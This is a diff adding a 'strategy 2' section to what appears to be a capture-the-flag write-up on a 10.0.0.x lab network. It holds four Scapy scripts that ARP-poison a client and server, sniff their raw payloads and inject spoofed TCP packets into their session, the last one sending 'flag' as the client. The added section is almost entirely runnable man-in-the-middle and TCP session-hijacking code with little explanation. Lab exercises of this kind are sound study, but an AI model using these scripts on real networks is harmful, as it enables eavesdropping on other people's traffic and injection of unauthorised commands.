@@ -2756,3 +2756,327 @@ Next, we have to assign `10.0.0.2` to our `eth0` interface.
 root@ip-10-0-0-1:/# ip addr add 10.0.0.2/24 dev eth0
 ```
 
+
+## strategy 2
+
+```
+from scapy.all import *
+import os
+import sys
+import threading
+import time
+
+# Configuration
+CLIENT_IP = "10.0.0.2"
+SERVER_IP = "10.0.0.3"
+INTERFACE = "eth0"  # Replace with your actual interface if needed
+
+def get_mac(ip):
+    """Returns the MAC address for a given IP."""
+    ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=False)
+    for _, rcv in ans:
+        return rcv.hwsrc
+    print(f"[!] Could not get MAC for {ip}")
+    sys.exit(1)
+
+def poison_arp(client_ip, client_mac, server_ip, server_mac):
+    """ARP poisoning to intercept traffic."""
+    print("[*] Starting ARP spoofing...")
+    spoof_to_client = ARP(op=2, pdst=client_ip, psrc=server_ip, hwdst=client_mac)
+    spoof_to_server = ARP(op=2, pdst=server_ip, psrc=client_ip, hwdst=server_mac)
+
+    try:
+        while True:
+            send(spoof_to_client, verbose=False)
+            send(spoof_to_server, verbose=False)
+            time.sleep(2)
+    except KeyboardInterrupt:
+        restore_arp(client_ip, client_mac, server_ip, server_mac)
+
+def restore_arp(client_ip, client_mac, server_ip, server_mac):
+    """Restore normal ARP behavior."""
+    print("[*] Restoring ARP tables...")
+    send(ARP(op=2, pdst=client_ip, psrc=server_ip, hwsrc=server_mac), count=5, verbose=False)
+    send(ARP(op=2, pdst=server_ip, psrc=client_ip, hwsrc=client_mac), count=5, verbose=False)
+    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+    sys.exit(0)
+
+def packet_callback(packet):
+    """Print only packets that contain a Raw payload between client and server."""
+    if IP in packet and Raw in packet:
+        ip = packet[IP]
+        if (ip.src == CLIENT_IP and ip.dst == SERVER_IP) or (ip.src == SERVER_IP and ip.dst == CLIENT_IP):
+            print("\n" + "-" * 50)
+            packet.show()
+            print("[+] Payload:", repr(packet[Raw].load))
+
+def main():
+    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")  # Enable IP forwarding
+
+    client_mac = get_mac(CLIENT_IP)
+    server_mac = get_mac(SERVER_IP)
+
+    poison_thread = threading.Thread(target=poison_arp, args=(CLIENT_IP, client_mac, SERVER_IP, server_mac))
+    poison_thread.daemon = True
+    poison_thread.start()
+
+    print("[*] Sniffing packets that contain application-layer data (Raw)...")
+    try:
+        sniff(filter=f"ip host {CLIENT_IP} and {SERVER_IP}", iface=INTERFACE, prn=packet_callback, store=0)
+    except KeyboardInterrupt:
+        restore_arp(CLIENT_IP, client_mac, SERVER_IP, server_mac)
+
+if __name__ == "__main__":
+    main()
+```
+
+```
+from scapy.all import *
+import threading
+import time
+import signal
+import sys
+
+# Configuration
+CLIENT_IP = "10.0.0.2"
+SERVER_IP = "10.0.0.3"
+ATTACKER_IP = "10.0.0.1"
+INTERFACE = "eth0"
+SERVER_PORT = 31337
+MESSAGE = b"Kunull was here"  # <- Customize your payload
+
+# Global state
+sent = False
+client_mac = getmacbyip(CLIENT_IP)
+server_mac = getmacbyip(SERVER_IP)
+attacker_mac = get_if_hwaddr(INTERFACE)
+
+def arp_spoof(target_ip, spoof_ip):
+    target_mac = getmacbyip(target_ip)
+    while True:
+        send(ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac), verbose=0)
+        time.sleep(2)
+
+def restore_arp():
+    send(ARP(op=2, pdst=CLIENT_IP, psrc=SERVER_IP, hwsrc=server_mac), count=3, iface=INTERFACE, verbose=0)
+    send(ARP(op=2, pdst=SERVER_IP, psrc=CLIENT_IP, hwsrc=client_mac), count=3, iface=INTERFACE, verbose=0)
+    sys.exit(0)
+
+def spoof_and_inject(pkt):
+    global sent
+    if sent or not pkt.haslayer(Raw):
+        return
+
+    if pkt[IP].src == SERVER_IP and pkt[IP].dst == CLIENT_IP and b"command: " in pkt[Raw].load:
+        print("[+] 'command: ' prompt detected")
+
+        ip = pkt[IP]
+        tcp = pkt[TCP]
+        ack = tcp.seq + len(pkt[Raw].load)
+
+        spoof_ip = IP(src=CLIENT_IP, dst=SERVER_IP)
+        spoof_tcp = TCP(sport=tcp.dport, dport=tcp.sport, seq=tcp.ack, ack=ack, flags='PA')
+
+        # First: send 'echo'
+        send(spoof_ip / spoof_tcp / b"echo", iface=INTERFACE, verbose=0)
+        print("[+] Sent 'echo'")
+
+        # Then: send your message
+        spoof_tcp.seq += len("echo")
+        send(spoof_ip / spoof_tcp / MESSAGE, iface=INTERFACE, verbose=0)
+        print(f"[+] Sent custom message: {MESSAGE}")
+
+        sent = True
+
+def sniff_response(pkt):
+    if pkt.haslayer(Raw) and pkt[IP].src == SERVER_IP and pkt[IP].dst == CLIENT_IP:
+        print(f"[+] Server response: {pkt[Raw].load}")
+
+if __name__ == "__main__":
+    print(f"[+] Attacker MAC: {attacker_mac}")
+    print(f"[+] Client MAC: {client_mac}")
+    print(f"[+] Server MAC: {server_mac}")
+
+    # Clean exit
+    signal.signal(signal.SIGINT, lambda x, y: restore_arp())
+
+    # Start ARP spoofing threads
+    threading.Thread(target=arp_spoof, args=(CLIENT_IP, SERVER_IP), daemon=True).start()
+    threading.Thread(target=arp_spoof, args=(SERVER_IP, CLIENT_IP), daemon=True).start()
+    print("[*] ARP spoofing in progress...")
+
+    # Start sniffing
+    sniff(iface=INTERFACE, filter=f"tcp and port {SERVER_PORT}", prn=lambda pkt: (spoof_and_inject(pkt), sniff_response(pkt)), store=0)
+```
+
+```
+from scapy.all import *
+import threading
+import time
+import signal
+import sys
+
+# Configuration
+CLIENT_IP = "10.0.0.2"
+SERVER_IP = "10.0.0.3"
+ATTACKER_IP = "10.0.0.1"
+INTERFACE = "eth0"
+SERVER_PORT = 31337
+MESSAGE = b"Kunull was here"  # <- Customize your payload
+
+# Global state
+sent = False
+client_mac = getmacbyip(CLIENT_IP)
+server_mac = getmacbyip(SERVER_IP)
+attacker_mac = get_if_hwaddr(INTERFACE)
+
+def arp_spoof(target_ip, spoof_ip):
+    target_mac = getmacbyip(target_ip)
+    while True:
+        send(ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac), verbose=0)
+        time.sleep(2)
+
+def restore_arp():
+    send(ARP(op=2, pdst=CLIENT_IP, psrc=SERVER_IP, hwsrc=server_mac), count=3, iface=INTERFACE, verbose=0)
+    send(ARP(op=2, pdst=SERVER_IP, psrc=CLIENT_IP, hwsrc=client_mac), count=3, iface=INTERFACE, verbose=0)
+    sys.exit(0)
+
+def spoof_and_inject(pkt):
+    global sent
+    print("\n[+] Intercepted packet (spoof_and_inject):")
+    pkt.show()  # Print full packet
+
+    if sent or not pkt.haslayer(Raw):
+        return
+
+    if pkt[IP].src == SERVER_IP and pkt[IP].dst == CLIENT_IP and b"command: " in pkt[Raw].load:
+        print("[+] 'command: ' prompt detected")
+
+        ip = pkt[IP]
+        tcp = pkt[TCP]
+        ack = tcp.seq + len(pkt[Raw].load)
+
+        spoof_ip = IP(src=CLIENT_IP, dst=SERVER_IP)
+        spoof_tcp = TCP(sport=tcp.dport, dport=tcp.sport, seq=tcp.ack, ack=ack, flags='PA')
+
+        echo_pkt = spoof_ip / spoof_tcp / b"echo"
+        print("\n[+] Sending spoofed 'echo' packet:")
+        echo_pkt.show()
+        send(echo_pkt, iface=INTERFACE, verbose=0)
+
+        spoof_tcp.seq += len("echo")
+        msg_pkt = spoof_ip / spoof_tcp / MESSAGE
+        print("\n[+] Sending spoofed message packet:")
+        msg_pkt.show()
+        send(msg_pkt, iface=INTERFACE, verbose=0)
+
+        sent = True
+
+def sniff_response(pkt):
+    print("\n[+] Intercepted packet (sniff_response):")
+    pkt.show()  # Print full response
+    if pkt.haslayer(Raw) and pkt[IP].src == SERVER_IP and pkt[IP].dst == CLIENT_IP:
+        print(f"[+] Server response payload: {pkt[Raw].load}")
+
+if __name__ == "__main__":
+    print(f"[+] Attacker MAC: {attacker_mac}")
+    print(f"[+] Client MAC: {client_mac}")
+    print(f"[+] Server MAC: {server_mac}")
+
+    signal.signal(signal.SIGINT, lambda x, y: restore_arp())
+
+    # Start ARP spoofing
+    threading.Thread(target=arp_spoof, args=(CLIENT_IP, SERVER_IP), daemon=True).start()
+    threading.Thread(target=arp_spoof, args=(SERVER_IP, CLIENT_IP), daemon=True).start()
+    print("[*] ARP spoofing in progress...")
+
+    # Start sniffing
+    sniff(
+        iface=INTERFACE,
+        filter=f"tcp and port {SERVER_PORT}",
+        prn=lambda pkt: (spoof_and_inject(pkt), sniff_response(pkt)),
+        store=0
+    )
+```
+
+```python title="script.py" showLineNumbers
+from scapy.all import *
+import threading
+import time
+import signal
+import sys
+
+# Configuration
+CLIENT_IP = "10.0.0.2"
+SERVER_IP = "10.0.0.3"
+ATTACKER_IP = "10.0.0.1"
+INTERFACE = "eth0"
+SERVER_PORT = 31337
+MESSAGE = b"flag"  # <-- Send 'flag' directly when prompted
+
+# Global state
+sent = False
+
+# Get MAC addresses
+client_mac = getmacbyip(CLIENT_IP)
+server_mac = getmacbyip(SERVER_IP)
+attacker_mac = get_if_hwaddr(INTERFACE)
+
+def arp_spoof(target_ip, spoof_ip):
+    target_mac = getmacbyip(target_ip)
+    while True:
+        send(ARP(op=2, pdst=target_ip, psrc=spoof_ip, hwdst=target_mac), iface=INTERFACE, verbose=0)
+        time.sleep(2)
+
+def restore_arp():
+    print("\n[!] Restoring ARP tables and exiting...")
+    send(ARP(op=2, pdst=CLIENT_IP, psrc=SERVER_IP, hwsrc=server_mac), count=3, iface=INTERFACE, verbose=0)
+    send(ARP(op=2, pdst=SERVER_IP, psrc=CLIENT_IP, hwsrc=client_mac), count=3, iface=INTERFACE, verbose=0)
+    sys.exit(0)
+
+def spoof_and_inject(pkt):
+    global sent
+    if sent or not pkt.haslayer(Raw):
+        return
+
+    if pkt[IP].src == SERVER_IP and pkt[IP].dst == CLIENT_IP and b"command:" in pkt[Raw].load:
+        print("[+] 'command:' prompt detected")
+
+        ip = pkt[IP]
+        tcp = pkt[TCP]
+        ack = tcp.seq + len(pkt[Raw].load)
+
+        spoof_ip = IP(src=CLIENT_IP, dst=SERVER_IP)
+        spoof_tcp = TCP(sport=tcp.dport, dport=tcp.sport, seq=tcp.ack, ack=ack, flags='PA')
+
+        # Send 'flag' instead of 'echo' + message
+        send(spoof_ip / spoof_tcp / MESSAGE, iface=INTERFACE, verbose=0)
+        print(f"[+] Sent spoofed 'flag' command as client")
+
+        sent = True
+
+def sniff_response(pkt):
+    if pkt.haslayer(Raw) and pkt[IP].src == SERVER_IP and pkt[IP].dst == CLIENT_IP:
+        print("[+] Intercepted packet (sniff_response):")
+        pkt.show()
+
+def handle_packet(pkt):
+    spoof_and_inject(pkt)
+    sniff_response(pkt)
+
+if __name__ == "__main__":
+    print(f"[+] Attacker MAC: {attacker_mac}")
+    print(f"[+] Client MAC: {client_mac}")
+    print(f"[+] Server MAC: {server_mac}")
+
+    # Clean exit on Ctrl+C
+    signal.signal(signal.SIGINT, lambda sig, frame: restore_arp())
+
+    # Start ARP spoofing in both directions
+    threading.Thread(target=arp_spoof, args=(CLIENT_IP, SERVER_IP), daemon=True).start()
+    threading.Thread(target=arp_spoof, args=(SERVER_IP, CLIENT_IP), daemon=True).start()
+    print("[*] ARP spoofing in progress...")
+
+    # Start sniffing and injecting
+    sniff(iface=INTERFACE, filter=f"tcp and port {SERVER_PORT}", prn=handle_packet, store=0)
+```
